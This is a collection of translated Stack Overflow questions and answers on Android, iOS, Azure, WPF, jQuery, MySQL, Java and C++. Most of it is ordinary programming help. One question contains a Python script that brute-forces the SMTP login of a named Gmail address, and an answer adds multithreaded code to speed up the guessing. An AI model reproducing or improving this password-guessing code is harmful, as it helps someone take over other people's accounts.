问题是我无法在 getview 中恢复 textview 的高度，因为我不知道下一个列表项的高度。

这是我的getview：

```
public View getView(int position, View convertView, ViewGroup parent) {
    final ViewHolder holder;

    View rowView = convertView;
    if (rowView == null) {
        LayoutInflater inflater = context.getLayoutInflater();
        rowView = inflater.inflate(resource, parent, false);
        holder = new ViewHolder();
        holder.imgAvatar = (ImageView) rowView.findViewById(R.id.imgAvatar);
        holder.textDetails = (TextView) rowView.findViewById(R.id.textDetails);
        holder.textPostTime = (TextView) rowView.findViewById(R.id.textPostTime);
        holder.textPost = (TextView) rowView.findViewById(R.id.textPost);
        rowView.setTag(holder);
    } else {
        holder = (ViewHolder) rowView.getTag();
    }

    holder.textDetails.setText(details.toString());
    holder.textPostTime.setText(x.postTime);
    holder.textPost.setText(Html.fromHtml(x.postBody, new URLImageGetter(holder.textPost, context), null, context));
    return rowView;
} 
```

这是行布局：

```
<TextView
    android:ellipsize="none"
    android:autoLink="web"
    android:textColor="#000000"
    android:id="@+id/textPost"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" /> 
```

**问题：**列表视图回收机制无法根据新内容计算已使用视图的新高度。不回收，太慢了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:22:59.523

所以，基本上你的问题是回收视图。当您的视图从 XML 膨胀时，它们会查看图像并决定要多高。这很好用，因为充气机可以导致高度为“wrap_content”，也就是最高的子组件有多高——这是动态的。

但是，当您的 getview 回收旧视图时（出于某种原因），它不会更新行的高度，您也不会（您以前从未这样做过，因为充气器会从“wrap_content”自动处理它）。从您的描述中可以看出，无论视图的高度是什么，您都会得到一行（之前的值是由充气机自动设置的）。

您的两个解决方案是：

1.  **不要回收视图**- 每次都增加一个新视图。您将看到性能下降，这可能仅在具有约 50 个或更多元素的列表中才会明显。如果它是一个小列表，这可能是最简单的（代码方面）选项，尽管它仍然会运行得稍微慢一些。
2.  **继续回收视图**- 如果你选择这个，你将不得不根据图像高度*自己*设置行的高度（或文本视图，无论是什么决定的） 。这是可行的，但需要更多的工作。我建议
3.  **秘密选项 3 - 标准化图像高度**- 如果您愿意**a.)**想继续回收视图但**b.)**不想编写代码来手动设置行高和**c.)**调整图像大小不会杀死你应用程序，您可以使用 setMaxHeight(int) 方法来确保所有图像的高度相同（或使用这样的方法[将](http://pastebin.com/KERgFCXA)图像调整为预定大小）

注意：我*很确定*（几乎可以肯定），通常情况下，如果将高度设置为“wrap_content”，它将换行到新的内容大小（因为它通常会在内容更新时更新大小）。我不能说为什么这不会发生在你身上——可能是“wrap_content”中的某些东西的大小设置为一个具体的值，因此没有调整大小，所以“wrap_content”没有改变，即使有是空的空间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-29T08:59:18.353

尝试在图像和文本视图上使用 requestLayout。它将帮助列表视图重新计算回收视图的高度。

# visual-studio-2010 - 如何启用从 C# 调用的 Visual Studio C++ 的调试

> ID：11091356
> 
> 赞同：0
> 
> 时间：2012-06-18T21:28:21.740
> 
> 标签：visual-studio-2010, winapi

（修改问题）我在 C# 中有一个 Windows 窗体应用程序，它调用了一些 C++，我需要添加日志以记录到 Visual Studio 中的某个窗口（输出选项卡或“立即窗口”选项卡......我没有'不在乎哪个。

我有这篇文章，但这些解决方案都不起作用..... [如何将 win32 c++ 登录到 Visual Studio 输出窗口？](https://stackoverflow.com/questions/11059675/how-to-log-in-win32-c-to-the-visual-studio-output-window)

下面的评论提到我可以打开调试，但是没有“调试选项卡”，没有任何选项卡，所以我不确定如何在下图中启用调试...

![在此处输入图像描述](../Images/bc13190b8ad5e2e68d0b7c274f03f61e.png)

谢谢，院长

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-02T19:30:18.253

> 我也看不到如何设置启用非托管调试？

在您的 C# EXE 项目上，而不是您的 C++ 项目上。右键单击 C# 项目，属性，调试选项卡：

![在此处输入图像描述](../Images/ccf276ac14c22364641d6ba7e17a8339.png)

# ios - 调用 setEnabled 时不重绘 UIActionSheet 中的子视图

> ID：11091361
> 
> 赞同：0
> 
> 时间：2012-06-18T21:28:38.903
> 
> 标签：ios, cocoa-touch

我在搜索视图控制器中有一个按钮，它调用以下方法，创建一个`UIActionSheet`包含两个`UISegmentedControl`s （用于选择搜索设置）。当用户在第一个分段控件上选择某个按钮时，我想禁用（`setEnabled:NO`）第二个分段控件。问题是它不会重绘（因此它永远不会被禁用）。如果我最初在创建 UIActionSheet 时 setEnabled:NO，则它最初被正确禁用。

我尝试通过调用强制重绘第二个分段控件和操作表`[UIView setNeedsDisplay]`，但这不起作用。

还尝试了第二个分段控件上的 removeFromSuperview 。

内置的 UIActionSheet 无法做到这一点吗？还是有更好的方法让我显示搜索设置？这是一个为 iOS5 编码的 iPhone 应用程序。弹出框不适用于 iPhone。我能想到的另一种方法是让设置显示在它自己的视图中，但我想避免这种情况。

```
-(void)onSettingsButtonClick:(id)sender
{
    // display segmented button views on actionSheet

    UIActionSheet *sheet = [[UIActionSheet alloc] initWithTitle:@"Search Settings" delegate:self cancelButtonTitle:@"Close" destructiveButtonTitle:nil otherButtonTitles:nil, nil];
    sheet.actionSheetStyle = UIActionSheetStyleDefault;

    UISegmentedControl * segFullTextOrTags = [[UISegmentedControl alloc] initWithItems:[NSArray arrayWithObjects:@"Tags", @"Full Text", @"Users", nil]];
    [segFullTextOrTags addTarget:self action:@selector(onSegFullTextOrTagsClicked:) forControlEvents:UIControlEventValueChanged];
    [segFullTextOrTags setSegmentedControlStyle:UISegmentedControlStyleBar];
    [segFullTextOrTags setTag:100];

    UISegmentedControl * segType2 = [[UISegmentedControl alloc] initWithItems:[NSArray arrayWithObjects:@"All Actions", @"Discussions", @"Responses", @"Comments", nil]];
    [segType2 addTarget:self action:@selector(onSegType2Clicked:) forControlEvents:UIControlEventValueChanged];
    [segType2 setSegmentedControlStyle:UISegmentedControlStyleBar];
    [segType2 setTag:101];

    [sheet showFromTabBar:self.tabBarController.tabBar];

    // code that expands the action sheet height and adjusts the view positions is omitted here

    // add the additional views to the actionSheet
    [sheet addSubview:segFullTextOrTags];
    [sheet addSubview:segType2];
}

-(void)onSegFullTextOrTagsClicked:(id)sender
{
    [self updateSettingsUI:(UIActionSheet*)sender];
}

-(void)onSegType2Clicked:(id)sender
{
    [self updateSettingsUI:(UIActionSheet*)sender];
}

-(void)updateSettingsUI:(UIActionSheet*)actionSheet
{
    UISegmentedControl * segFullTextOrTags = (UISegmentedControl*)[actionSheet viewWithTag:100];
    UISegmentedControl * segType2 = (UISegmentedControl*)[actionSheet viewWithTag:101];

    if (segFullTextOrTags.selectedSegmentIndex == 2) // users
    {
        // disable 2nd segmented button control
        [segType2 setEnabled:NO];
    }
    else
    {
        // enable 2nd segmented button control
        [segType2 setEnabled:YES];
    }

    // doesn't work...
    [segType2 setNeedsDisplay];
    [actionSheet setNeedsDisplay];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:11:40.667

我认为 UIActionSheet 不是向用户呈现设置视图的正确控件。

从类参考文档中：

> 使用 UIActionSheet 类为用户提供一组备选方案，用于如何继续执行给定任务。您还可以使用操作表来提示用户确认潜在危险的操作。操作表包含一个可选标题和一个或多个按钮，每个按钮对应于要采取的操作。

相反，您应该创建一个 UIViewController 子类并以模态方式或使用导航控制器呈现它。

我不知道为什么`setEnabled`在您的代码中不起作用。`setNeedsDisplay`没有必要，控件应该重绘自己。检查 updateSettingsUI 和 onSettingsButtonClick 中的 segType2 是否是同一个对象。

# azure - 将 650,000 个文档上传到 Azure

> ID：11091366
> 
> 赞同：1
> 
> 时间：2012-06-18T21:29:23.703
> 
> 标签：azure

我似乎找不到任何关于将数据批量上传到 azure 的参考。

我有一个包含 650,000 个 pdf 文档的文档存储，占用了大约 1.2 TB 的磁盘空间。

通过 Web 将这些文件上传到 Azure 会很困难。有没有办法可以邮寄硬盘并让您的团队为我上传？

如果没有，您能推荐上传这么多文件的最佳方式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T23:04:56.850

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T23:01:59.850

由于 Windows Azure 不支持磁盘传送，您最好使用支持并行上传的第 3 方应用程序（或编写您自己的应用程序）。这样，您仍然可以更快地上传。Gladinet、Cloudberry 等第 3 方应用程序可用于上传数据，但我不确定它们如何配置以获得最大并行上传以实现最快上传。

如果您决定自己编写，这里是起点：[带有进度更改通知的异步并行块 Blob 传输](http://blogs.msdn.com/b/kwill/archive/2011/05/30/asynchronous-parallel-block-blob-transfers-with-progress-change-notification.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-08T14:49:50.980

我知道这对于 OP 来说有点太晚了，但是在 Azure 管理门户中的存储下，选择您的存储实例，然后单击顶部的导入/导出链接。在该屏幕的底部，有一个“创建导入作业”链接和图标。此外，如果您单击最右侧的蓝色帮助图标，它会显示：

*在通过网络上传成本过高或不可行的情况下，您可以使用 Windows Azure 导入/导出服务将大量文件数据传输到 Windows Azure Blob 存储。您还可以使用导入/导出服务将驻留在 Blob 存储中的大量数据及时且经济高效地传输到本地安装。使用 Windows Azure 导入/导出服务将数据传输到 Blob 存储*

*要将大量文件数据传输到 Blob 存储，您可以将一个或多个包含该数据的硬盘驱动器发送到 Microsoft 数据中心，您的数据将在该数据中心上传到您的存储帐户。同样，要从 Blob 存储中导出数据，您可以将空硬盘驱动器发送到 Microsoft 数据中心，在那里您的存储帐户中的 Blob 数据将被复制到您的硬盘驱动器，然后返回给您。在发送包含数据的驱动器之前，您将加密驱动器上的数据；当 Microsoft 导出您的数据以发送给您时，该数据也会在发送前进行加密。*

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-18T21:37:05.240

虽然 Azure 目前不提供物理摄取过程，但如果您与 Azure 团队好好交谈，他们可以一次性完成。如果您愿意，我可以为您联系产品团队（greenbutton dot com 的戴夫）。

或者，还有一些解决方案，例如 Aspera，它提供了通过 UDP 进行的加速数据传输，并且正在与 Azure 媒体服务产品一起在 Azure 中进行 beta 测试。

我们也有一些工具可以帮助解决这个问题[http://www.greenbutton.com](http://www.greenbutton.com)并利用 Aspera 的技术。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-03T08:35:49.627

windows azure storage powershell 和 azcopy 都可以将数据批量上传到 azure。

对于 azure storage powershell，您可以使用`ls -File -Recurse | Set-AzureStorageBlobContent -Container upload`.

您可以参考[http://msdn.microsoft.com/en-us/library/dn408487.aspx](http://msdn.microsoft.com/en-us/library/dn408487.aspx)了解更多详情。

对于 azcopy，可以参考这篇文章[http://blogs.msdn.com/b/windowsazurestorage/archive/2012/12/03/azcopy-uploading-downloading-files-for-windows-azure-blobs.aspx](http://blogs.msdn.com/b/windowsazurestorage/archive/2012/12/03/azcopy-uploading-downloading-files-for-windows-azure-blobs.aspx)

# wpf - 使列表视图可垂直扩展

> ID：11091369
> 
> 赞同：1
> 
> 时间：2012-06-18T21:29:31.503
> 
> 标签：wpf, xaml

我已将我的 xaml 页面分为 3 列。最后一列有一个列表视图，现在我在它下面添加一个属性网格。如何在 UI 上添加允许用户垂直调整列表视图或属性网格的功能？我试过了，但要么我使用了错误的属性，要么不是出于这个原因。任何帮助将不胜感激。

```
 <StackPanel Grid.Column="5" Background="gray">

        **<ScrollViewer VerticalScrollBarVisibility="Auto" >**
        <ListView Background="LightGray" Opacity="1" ForceCursor="False" x:Name="myListView" x:FieldModifier="public" Height="326" >
            <ListView.View>
                <GridView>
                    <GridViewColumn Header="Parts List" Width="80"/>
                 </GridView>
            </ListView.View>
        </ListView>
        **</ScrollViewer>**

        <DockPanel>
            <Grid>
                <wpg:WpfPropertyGrid x:Name="PropertyGrid1" 

                VerticalAlignment="Stretch" HelpVisible="{Binding ElementName=ShowDescrip, Path=IsChecked}" 
                ToolbarVisible="{Binding ElementName=ShowToolbar, Path=IsChecked}"
                PropertySort="{Binding ElementName=ComboSort, Path=SelectedItem}" />
            </Grid>
        </DockPanel>
    </StackPanel> 
```

谢谢。阿米特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:35:00.087

您可能应该使用 a`Grid`和 a `GridSplitter`。您可以[在这里](http://wpftutorial.net/GridLayout.html#resize)查看一个简单的示例。

# facebook-like - 需要在不使用 Open Graph 元标记的情况下添加 Facebook Like 按钮的说明

> ID：11091371
> 
> 赞同：0
> 
> 时间：2012-06-18T21:29:39.417
> 
> 标签：facebook-like

如果不在该页面上包含打开的图形标签，我找不到将“赞”按钮添加到页面的具体说明。有问题的页面是第三方注册站点，我们无权访问页面标题来添加元标记。我相信有一个不使用 Open Graph 的旧版本（在它存在之前？）

任何帮助或建议表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:33:33.243

您可以添加不带 Open Graph 标签的点赞按钮，但是您不能设置标题、描述和图像。

旧[版本的共享按钮已弃用](https://developers.facebook.com/docs/share/)，很快将不再支持。

# jquery - jQuery.validate 错误消息未在 Twitter Bootstrap 中格式化

> ID：11091372
> 
> 赞同：1
> 
> 时间：2012-06-18T21:29:49.640
> 
> 标签：jquery, jquery-validate, twitter-bootstrap

我有一个通过 jQuery Validate 验证的注册表单，当表单正确捕获错误并显示验证错误消息时，**它不会使用我的“label label-important”类，直到我强制验证/单击提交按钮第二次时间。**

看看这里：http: [//jsbin.com/uguwem/12/](http://jsbin.com/uguwem/12/)

这是我的js代码：

```
$('#registrationform').validate({ 
    highlight: function (element, errorClass, validClass) { 
        $(element).parents("div[class='control-group']").addClass("error");
        $(element.form).find("span[for=" + element.id + "]").addClass("label label-important");
        }, 
        unhighlight: function (element, errorClass, validClass) { 
                $(element).parents(".error").removeClass("error"); 
        }, 
        errorElement: 'span' 
 }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T03:15:14.777

它看起来像在生成错误元素（在您的情况下为 a ）***之前***`highlight`被调用。*`span`*

 *这意味着当您`span`第一次尝试在 中查找时`highlight`，它并不存在。`validate`不会删除错误元素，它只是显示和隐藏它们，这就是第二次验证表单时发现*它的原因。*

我会通过使用该`errorPlacement`选项并手动添加类来解决这个问题：

```
$(document).ready(function() {
    $('#registrationform').validate({
        //errorClass: "label-important",
        highlight: function(element, errorClass, validClass) {
            $(element).parents("div[class='control-group']").addClass("error");

        },
        unhighlight: function(element, errorClass, validClass) {
            $(element).parents(".error").removeClass("error");
        },
        errorElement: 'span',
        errorPlacement: function($error, $element) {
            $error.addClass("label label-important").insertAfter($element);
        }
    });
});​ 
```

**更新示例：http:** [//jsbin.com/opoqan/](http://jsbin.com/opoqan/)*

# mysql - 查询是如何处理的？

> ID：11091374
> 
> 赞同：1
> 
> 时间：2012-06-18T21:29:53.203
> 
> 标签：mysql

有人可以逐步解释如何处理此查询吗？

```
SELECT F.ID,
       F.FirstName,
       h.UserID,
       h.TYPE,
       L.UserID,
       L.LOGGEDIN
FROM   users AS F
       INNER JOIN history AS h
         ON h.USERID = F.ID
       LEFT JOIN Login AS L
         ON L.USERID = f.MONEY 
```

如果我删除`L.UserID, L.LOGGEDIN and LEFT JOIN`它会给我这个结果：

```
SELECT F.ID,
       F.FirstName,
       h.UserID,
       h.TYPE
FROM   users AS F
       INNER JOIN history AS h
         ON h.USERID = F.ID 
```

* * *

```
ID  FirstName   UserID  TYPE
6   rafal            6  A
6   rafal            6  A
6   rafal            6  A
5   rafal            5  B 
```

这是否意味着结果在第一步中由 INNER Join 返回，并且进一步向左加入？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:08:45.730

是的。您还可以`FROM`将查询的一部分编写为：

```
FROM   ( users AS F
         INNER JOIN history AS h
           ON h.USERID = F.ID
       )
       LEFT JOIN Login AS L
         ON L.USERID = f.MONEY 
```

如果这对你有帮助。这就是`FROM`零件的解析方式。

现在订单或处理首先是`FROM`子句，然后是`SELECT`. 对于更复杂的查询，它是：

```
FROM -> WHERE  -> GROUP BY -> HAVING -> SELECT -> DISTINCT -> 
-> UNION -> ORDER BY -> OFFSET -> LIMIT 
```

请注意，这并不意味着 DBMS 将按此顺序处理查询。它可以选择走不同的道路。不管它如何处理它，结果集应该与以这种方式处理的结果集相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:32:11.663

很可能，是的，运行`EXPLAIN`后跟您的查询，它会告诉您。

# global-variables - 在java中使用应用程序范围变量

> ID：11091377
> 
> 赞同：15
> 
> 时间：2012-06-18T21:30:25.143
> 
> 标签：global-variables, scope

我的公司将在接下来的几个月里重新设计我们的网站，从一个 ColdFusion 网站变成一个用 Java 编写的网站。我刚刚学习 Java，我很好奇如何在 Java Web 应用程序中设置应用程序范围变量。ColdFusion 具有 application.cfm 文件，其中包含应用程序内所有 ColdFusion 页面/组件可访问的变量。Java 显然没有直接等效于该文件，所以我想知道如何在 Java 中重新创建类似的东西。我希望有一个中心位置，webapp 中的所有 jsp 页面、servlet、类等都可以访问。

那么做这样的事情的最好方法是什么？

有没有人有任何类似的例子？

应用程序范围变量应该放在一个类中吗？一个xml文件？一个jsp页面？别的东西？

在java webapp中拥有应用程序范围变量是否可行？

示例：这将是一个保存图像文件夹路径的地方，因此在单个 JSP 页面或类或任何需要访问该图像文件夹的地方，您可以引用该路径的应用程序范围变量，而不是将其写入每个地方。然后，如果由于某种原因我们需要移动该图像文件夹的位置，我们只需更改一个位置的路径变量，而不必更新引用该图像文件夹的 20 个位置。

我在网上的研究中找不到任何关于这类事情的信息，这就是我在这里询问的原因。我知道对这类事情要求解释很多，但我想我会问，看看我能得到什么类型的回应。

感谢您提供有关此主题的任何帮助。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-06-18T21:44:34.720

等效的可能是[ServletContext](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html)

在您的控制器 servlet 中：

```
ServletContext context = request.getSession().getServletContext(); 
```

就像在会话对象中一样，您也可以在 servlet 上下文中存储属性

```
context.setAttribute("someValue", "aValue");

Object attribute = context.getAttribute("someValue"); 
```

如果您刚开始使用 Java，并且要构建一个重要的应用程序，我建议您使用流行的框架，例如[Spring](http://www.springsource.org)或[Struts](http://struts.apache.org/2.x/)

# android - 尝试为我的任务列表使用自定义 CursorAdapter，但我遇到了问题

> ID：11091382
> 
> 赞同：2
> 
> 时间：2012-06-18T21:30:36.910
> 
> 标签：android, android-cursoradapter, custom-cursor

我正在制作一个简单的任务列表应用程序，并且我正在使用数据库来保存所有内容。我编写了一个自定义 CursorAdapter，扩展 ResourceCursorAdapter，来处理数据。一切都显示得很好，但是一旦你开始超越它，事情就会变得粗略。首先，我的实现：

```
import android.app.AlertDialog;
import android.content.Context;
import android.database.Cursor;
import android.support.v4.widget.ResourceCursorAdapter;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.Filterable;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * @author Dave Smith
 *
 */
public class TaskCursorAdapter extends ResourceCursorAdapter {

    /**
     * @param context
     * @param layout
     * @param c
     * @param from
     * @param to
     * @param flags
     */
    private Context context;
    private int layout, isCheckedFromDb, IdFromDb;
    private Cursor cursor;

    public TaskCursorAdapter(Context context, int layout, Cursor c,
            int flags) {
        super(context, layout, c, flags);
        this.context = context;
        this.layout = layout;
    }
    public TaskCursorAdapter(Context context, int layout){
        super(context, layout, null, 0);
        this.context = context;
        this.layout = layout;
    }
    public TaskCursorAdapter(Context context, int layout, Cursor c){
        super(context, layout, c, 0);
        this.context = context;
        this.layout = layout;
    }
    public TaskCursorAdapter(Context context, int layout, Cursor cursor, boolean autoRequery)
    {
        super(context, layout, cursor, autoRequery);
        this.context = context;
        this.layout = layout;
    }
    public View newView(Context context, Cursor cursor, ViewGroup parent){
        final LayoutInflater inflater = LayoutInflater.from(context);
        View v = inflater.inflate(layout, parent, false);
        return v;
    }
    public void bindView(View v, Context context, Cursor c){
        CheckBox taskCheckBox = (CheckBox)v.findViewById(R.id.taskCheckBox);
        TextView taskText = (TextView)v.findViewById(R.id.taskTitle);
        TextView taskNote = (TextView)v.findViewById(R.id.taskNote);
        final long assignedID = v.getID();
        //v.setClickable(true);     
        //LinearLayout holder = (LinearLayout)v.findViewById(R.id.container);
        //holder.setClickable(true);
        //IdFromDb = c.getInt(c.getColumnIndex(NagTasksDatabaseHelper.ID));
        taskText.setText(c.getString(c.getColumnIndex(NagTasksDatabaseHelper.TASK)));
        taskNote.setText(c.getString(c.getColumnIndex(NagTasksDatabaseHelper.NOTE)));
        //isCheckedFromDb = c.getInt(c.getColumnIndex(NagTasksDatabaseHelper.CHECKED));
        taskCheckBox.setChecked(c.getInt(c.getColumnIndex(NagTasksDatabaseHelper.CHECKED))==1);
        //cursor = c;
        taskCheckBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {

            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                //Really Old method:
                /*NagTasksDatabaseHelper helper = new NagTasksDatabaseHelper(null);
                int idCol = cursor.getColumnIndex(NagTasksDatabaseHelper.ID); 
                int taskID = helper.getNewTaskId();
                if (idCol!=-1)
                {
                    taskID= cursor.getInt(idCol);
                    if (isChecked){
                        helper.checkOffTask(taskID);
                    } else {
                        helper.uncheckTask(taskID);
                    }
                }
                //TODO Solve how to use helper to change ISCHECKED in database
                helper.close();
                //Old method:
                NagTasksDatabaseHelper helper = new NagTasksDatabaseHelper(null);
                if (isChecked) {
                    helper.checkOffTask(IdFromDb);
                } else {
                    helper.uncheckTask(IdFromDb);
                }
                helper.close();*/
                //Current method:

                if (assignedID!=View.NO_ID) {
                    NagTasksDatabaseHelper helper = new NagTasksDatabaseHelper(buttonView.getContext());
                    if (isChecked) {
                        helper.checkOffTask(assignedID);
                    } else {
                        helper.uncheckTask(assignedID);
                    }
                    helper.close();
                } else {
                    AlertDialog.Builder builder = new AlertDialog.Builder(buttonView.getContext());
                    builder.setMessage("No ID found. Try something else.");
                    builder.setCancelable(true);
                    builder.create().show();
                }
            } 
        });
    }

} 
```

# 第一期

**编辑：**问题已解决，但我不知道如何解决。

在当前状态下，当我点击运行时，Eclipse 的控制台中出现错误。它根本不会影响它的运行情况，但是在之前的实现中，我使用了一个只有 CheckBox 并且只是更改了 CheckBox 文本的布局，这个错误没有出现：

```
[2012-06-18 16:10:15 - ddms] null
java.lang.NullPointerException
    at com.android.ddmlib.JdwpPacket.writeAndConsume(JdwpPacket.java:213)
    at com.android.ddmlib.Client.sendAndConsume(Client.java:575)
    at com.android.ddmlib.HandleHello.sendHELO(HandleHello.java:142)
    at com.android.ddmlib.HandleHello.sendHelloCommands(HandleHello.java:65)
    at com.android.ddmlib.Client.getJdwpPacket(Client.java:672)
    at com.android.ddmlib.MonitorThread.processClientActivity(MonitorThread.java:317)
    at com.android.ddmlib.MonitorThread.run(MonitorThread.java:263)

[2012-06-18 16:10:15 - ddms] null
java.lang.NullPointerException
    at com.android.ddmlib.JdwpPacket.writeAndConsume(JdwpPacket.java:213)
    at com.android.ddmlib.Client.sendAndConsume(Client.java:575)
    at com.android.ddmlib.HandleHello.sendHELO(HandleHello.java:142)
    at com.android.ddmlib.HandleHello.sendHelloCommands(HandleHello.java:65)
    at com.android.ddmlib.Client.getJdwpPacket(Client.java:672)
    at com.android.ddmlib.MonitorThread.processClientActivity(MonitorThread.java:317)
    at com.android.ddmlib.MonitorThread.run(MonitorThread.java:263) 
```

# 第 2 期

使用此 CursorAdapter 的 ListFragment 未执行其`OnListItemClick()`方法。同样，我已将 ListFragment 的 ListView 注册为使用 ContextMenu（带`registerForContextMenu()`），但长按不会调出上下文菜单。

# 第 3 期

取消注释`taskCheckBox.setOnCheckedChangeListener`通常会导致在选中复选框时发生不好的事情。通常，它会抛出空指针异常并崩溃，因为它不知道`_id`要调用什么`checkOffTask()`或`uncheckTask()`. （**编辑**：最近编辑中所做的更改......仍然没有做我想要做的事情，但至少它不会崩溃。也很烦人`getItemId()`要求一个职位，我不知道该怎么做从光标中为 ListView 中的给定项目检索它，或者我会使用它。）

* * *

谁能帮我解决这些问题？[尽管之前就这个问题寻求帮助，](https://stackoverflow.com/questions/10769722/trying-to-make-a-custom-cursoradapter-that-converts-unixtime-into-something-read)但我仍然不清楚 CursorAdapters 是如何工作的。

**编辑：**我应该注意到我的应用程序有另一个列表，它使用了一个非常轻微的调整`ResourceCursorAdapter`（见链接的问题），并且这些问题都没有出现在那里。（虽然问题 3 没有理由弹出，因为它是一个简单的字符串列表。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-26T23:01:17.583

# 问题 1：

将跳过，因为它已解决。

# 问题 2：

如上[一个问题](https://stackoverflow.com/questions/4316600/android-list-view-clickable-problem)所述，如果视图具有可聚焦对象，则由于 SDK 中的错误，不可能使整个视图可点击。因此，我进入了膨胀的 XML 并将属性添加`android:focusable="false"`到每个项目。列表项现在可以单击和长按。

# 问题 3：

正如[reddit 上的一位好人](http://www.reddit.com/r/androiddev/comments/vlue6/dae_hate_having_to_make_their_own_cursoradapters/c55sjb0)所说，我在“旧方法”的正确轨道上，但需要使用本地`final long`而不是参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T04:32:10.563

首先是随机建议。不要使用 getColumnIndex - 或者至少在某处缓存它。索引总是与投影中的顺序匹配，所以常见的模式是只使用它（所以如果你的投影是 ['_id', 'something', 'else'] 然后声明 INDX_ID = 0; INDX_SOMETHING = 1; 等等。 ..)

所以像这样创建匿名内部类并不是你能做的最高效的事情。我会改为执行以下操作：

使用 bindView 中的行 ID 或位置标记视图（如 reddit 上所述，这*不是*v.getID()）。您可以使用 checkBoxView.setTag() 来做到这一点。这使您可以随意将数据标记到视图上。

然后，在新视图中注册检查更改侦听器 - 理想情况下传递一个静态类而不是匿名内部，但至少您将通过在 newView 中执行它来限制创建这些的频率。回调将使用 v.getTag() 来获取行 ID（或您在 bindView 中放入的任何其他内容）并可以使用它来执行您想要的任何工作

# python - 如何使用线程使此功能更快？

> ID：11091384
> 
> 赞同：0
> 
> 时间：2012-06-18T21:30:43.340
> 
> 标签：python, multithreading, performance, gmail

我花了很多时间为 gmail 制作这个暴力破解程序：

```
import smtplib
from itertools import permutations
import string
import time
import os
from datetime import datetime
allC=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"]
num=1
allP=len(allC)**num
sumt=0
procent=0
while True:
   for i in permutations(allC, num):
      try :
          i="".join(i)
          server = smtplib.SMTP('smtp.gmail.com',587) 
          server.ehlo()
          server.starttls()
          server.ehlo()
          server.login('raslav.milutinovic@gmail.com',i)
          print str(datetime.now())
          print i
          break
          server.close()     
      except Exception,e:
          if 'Errno 11001' in e:
               input()
          pass
    sumt=sumt+1.00001
    procent=sumt/allP*100
    print "Level :",num
    print "Procent :",int(procent)

   num=num+1
   procent=0
   sumt=0
   allP=len(allC)**num 
```

注意：缩进可能不正确但非常慢=每小时尝试 5000 次

我如何使用线程来测试更多而不是一个等时间？而且我也不打算用它来作恶……只是一个简单的学习项目

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:31:10.057

这是 Python 的线程擅长*的任务之一。*

每当网络代码被阻塞时，其他线程就会运行。SO 上已经有帖子展示了如何以类似的方式将 urllib 与线程一起使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T23:42:57.440

创建一个使用排列填充列表的生成器线程和从列表中获取值并测试它的多个其他线程：

```
from time import sleep
from threading import Thread
queue = []
done = False
num_consumers = 10

def generate():
    #the generator - fill queue with values and set a flag when done
    global queue, done
    for val in permutations(allc, num):
        if len(queue) > 100:
            sleep(0.5)
            continue
        queue.append(val)
    done = True

def consume():
    #the consumer - get a value from the queue and try to login
    global queue, done
    while queue or not done:
        if len(queue) == 0:
            sleep(0.05)
            continue
        try_login(queue.pop())

#create a generator and multiple consumer threads with the respective fcts
generator = Thread(target=generate)
consumers = [Thread(target=consume) for _ in range(num_consumers)]
#start the consumers and the generator
[c.start() for c in consumers]
generator.start() 
```

这不是一个完整的方法 - 例如，`queue.pop()`可能应该包含在 try 语句中，因为尽管检查线程是否在 之后`if`但之前切换，但列表仍然可以是空的`pop`，您还需要优化睡眠值和数量消费者等。但最重要的是，它不会让你在黑客 gmail 方面走得太远——这应该是蛮力不可能的，因为他们在尝试太多失败后部署了验证码、IP 禁令和其他好东西。你最好的方法是社会工程:)

# c++ - 修改 const 成员错误做法或 UB 中的 const 变量？

> ID：11091385
> 
> 赞同：4
> 
> 时间：2012-06-18T21:30:47.783
> 
> 标签：c++

下面的代码是不好的做法还是未定义的行为？本质上，我正在调用 const func 来修改未标记为可变的成员。[演示](http://ideone.com/ga5hm)链接

感谢 Mehrdad 对这个问题的启发（他的问题[Do this code subvert the C++ type system?](https://stackoverflow.com/questions/11077566/does-this-code-subvert-the-c-type-system)）和 david 对演示的微小改进。

```
#include <iostream>
using namespace std;

struct BreakConst
{
    int v;
    int *p;
    BreakConst() { v = 0; p = &v; } 
    void break_stuff() const { ++*p; }
};
void f(const BreakConst& bc) {
    bc.break_stuff();
} 
```

### 大多数答案基于的原始版本：

David Rodríguez、jpalecek、Mehrdad 回答
是：这是“未定义的行为”

```
int main()
{
    const BreakConst bc;
    cout << bc.v << endl;   // 0
    bc.break_stuff();       // O:)
    cout << bc.v << endl;   // 1

    return 0;
} 
```

### 新的替代问题：

Mehrdad 回答
否：这不是“未定义的行为”

```
int main()
{
    BreakConst bc;
    cout << bc.v << endl;   // 0
    f(bc);                  // O:)
    cout << bc.v << endl;   // 1

    return 0;
} 
```

结果：

```
0
1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:35:55.127

